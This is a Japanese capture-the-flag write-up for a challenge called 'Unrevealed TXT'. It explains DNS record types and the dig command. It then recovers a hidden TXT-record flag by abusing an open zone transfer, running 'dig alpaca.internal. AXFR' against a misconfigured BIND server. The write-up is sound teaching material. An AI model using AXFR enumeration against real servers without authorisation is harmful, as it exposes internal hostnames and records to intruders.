# Unrevealed TXT

## / Overview

権威DNSサーバからのゾーン転送

## / Writeup

まずはフラグがある場所を探索すると`db.alpaca.internal`にあることが分かります．

```
REPLACE_ME      IN   TXT        "Alpaca{REDACTED}"
```

さらに`REPLACE_ME`は名前の通り，`Dockerfile`でランダムな文字列に置き換えられています.

```
RUN sed -i "s/REPLACE_ME/$(tr -dc 'A-Za-z0-9' </dev/urandom | head -c 32)/g" /etc/bind/zones/db.alpaca.internal
```

`nc 34.170.146.252 42749`でサーバに接続すると`dig`コマンドを使うことが出来ます．このコマンドについては後で紹介します．

チャレンジの内容は以上のようになっていますが，見慣れないファイル構成でどこから手をつければ良いのか分かりません．

なので今回のチャレンジのトピックである`DNS`について調べてみます．

### DNS

DNSとは Domain Name System の略で，主にドメインからIPアドレスを調べるために使われます．

例えば`google.com.`はご存知の通りGoogle社が提供する検索エンジンのドメインですが，ブラウザのアドレスバーにこのドメインを入力するだけで，ページが表示されるのはDNSの仕組みを使っています．

細かい仕様の説明は省きますが，`google.com.`と検索する時，ブラウザはそのドメインを管理するDNSサーバに対して対応するIPアドレスを要求します．ブラウザは受け取ったIPアドレスに対して通信をすることでページを表示させています．

`dig`コマンドはこれを手動で行うことができるコマンドです．以下のコマンドを試してみてください．

```sh
$ dig google.com.

# ---snip---

;; ANSWER SECTION:
google.com.             242     IN      A       142.251.119.100
google.com.             242     IN      A       142.251.119.101
google.com.             242     IN      A       142.251.119.102
google.com.             242     IN      A       142.251.119.113
google.com.             242     IN      A       142.251.119.138
google.com.             242     IN      A       142.251.119.139

# ---snip---
```

この用に`google.com.`がどのIPアドレスに紐づいているかを調べられました．

DNSには他にも機能があり，それぞれレコードタイプを指定することで使用することができます．今回のようにIPv4アドレスを得るには`A`を明示的に指定することも可能です．実際に先程の出力にも`... IN A ...`のように`A`レコードであることが明記されています．他の機能を使うには`dig`コマンドの末尾にレコードタイプを追加します．主な機能については以下のとおりです．

| レコードタイプ | 技術的役割 |
| :--- | :--- |
| **A** | FQDNに対するIPv4アドレスのマッピング |
| **AAAA** | FQDNに対するIPv6アドレスのマッピング |
| **CNAME** | 正規ドメイン名へのエイリアス |
| **MX** | ドメイン宛メールの配送先MTAおよび優先度指定 |
| **TXT** | 任意の文字列データ |
| **NS** | ゾーンの権威ネームサーバの委譲・指定 |
| **SOA** | ゾーンの管理情報 |
| **PTR** | IPアドレスからFQDNへのリバースマッピング（逆引き） |

### DNSサーバ

チャレンジに戻りましょう．`dns`というディレクトリにはBINDと呼ばれるソフトウェアを用いた際にDNSサーバを構築するための最小ファイル構成が含まれています．具体的には`named.conf`と`db.alpaca.internal`です．前者にはDNSサーバの設定が記述されていて，後者はDNSレコードのデータベース（ゾーンファイル）となっています．

ゾーンファイルの全体を見ると次のようになっています．

```
$TTL 3600
@               IN   SOA        ns.alpaca.internal. admin.alpaca.internal. (
                                    2026041701   ; serial
                                    3600         ; refresh
                                    1800         ; retry
                                    604800       ; expire
                                    300          ; minimum
                                    )
                IN   NS         ns.alpaca.internal.

ns              IN   A          127.0.0.1

paca            IN   TXT        "pacapaca"
llama           IN   TXT        "alpaca"

REPLACE_ME      IN   TXT        "Alpaca{REDACTED}"
```

これらのデータは`dig`コマンドで`alpaca.internal.`にそれぞれのサブドメインをつけて，欲しいレコードの種類を指定すると見れます．例えば`dig paca.alpaca.internal. TXT`では`"pacapca"`が得られます．

### 解く

ここまでの情報から，今回の目標は`dig REPLACE_ME.alpaca.internal. TXT`を実行することだと分かります．

`REPLACE_ME`はランダムな文字列であり予測は困難だと判断し，サブドメインを列挙する方法をインターネットで調べることにしました．その結果，以下の記事がヒットしました．

> サブドメイン名列挙の方法についてまとめてみた
>
> https://blog.nflabs.jp/entry/2022/12/19/093000


ここにAXFRレコードを用いたサブドメインの列挙の方法が紹介されています．AXFRを指定すると，そのDNSサーバが持つデータベースをそのまま見ることができます．これはDNSサーバがゾーン転送を有効にしていなければいけないのですが，`named.conf`を見ると有効になっています．


```
allow-transfer { any; };
```

つまり`dig alpaca.internal. AXFR`を実行するとゾーンファイルの情報がそのまま表示されます．ここにフラグの情報も含まれていました．

```sh
$ nc 34.170.146.252 42749
Example: paca.alpaca.internal TXT
$ dig alpaca.internal. AXFR

; <<>> DiG 9.20.21-1~deb13u1-Debian <<>> @dns alpaca.internal. AXFR
; (1 server found)
;; global options: +cmd
alpaca.internal.        3600    IN      SOA     ns.alpaca.internal. admin.alpaca.internal. 2026041701 3600 1800 604800 300
alpaca.internal.        3600    IN      NS      ns.alpaca.internal.
llama.alpaca.internal.  3600    IN      TXT     "alpaca"
ns.alpaca.internal.     3600    IN      A       127.0.0.1
paca.alpaca.internal.   3600    IN      TXT     "pacapaca"
UdL2xTWXD5R7PeLxDL9ulVHcCJyUNedj.alpaca.internal. 3600 IN TXT "Alpaca{...}"
alpaca.internal.        3600    IN      SOA     ns.alpaca.internal. admin.alpaca.internal. 2026041701 3600 1800 604800 300
;; Query time: 0 msec
;; SERVER: 172.16.27.2#53(dns) (TCP)
;; WHEN: Mon Apr 27 12:56:47 UTC 2026
;; XFR size: 7 records (messages 1, bytes 324)
```